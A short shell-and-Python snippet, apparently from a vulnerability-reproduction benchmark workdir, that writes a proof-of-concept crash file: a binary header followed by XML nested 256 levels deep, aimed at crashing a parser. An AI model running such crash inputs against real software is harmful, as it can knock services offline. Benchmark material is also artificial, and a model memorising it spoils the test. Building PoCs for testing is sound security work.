cd /CybinGym_workdir
python3 - <<'PY'
import struct
depth=256
parts=['<r>']
for i in range(depth):
    parts.append('<d>'); parts.append('<sib/>')
parts.append('<c/>')
parts+=['</d>']*depth; parts.append('</r>')
body=''.join(parts).encode()
data=struct.pack('<I',0)+struct.pack('<Q',0)+struct.pack('<Q',len(body))+body
open('/CybinGym_workdir/poc_crash','wb').write(data)
print("poc_crash len",len(data),"body",len(body))
PY
ls -l /CybinGym_workdir/poc_crash
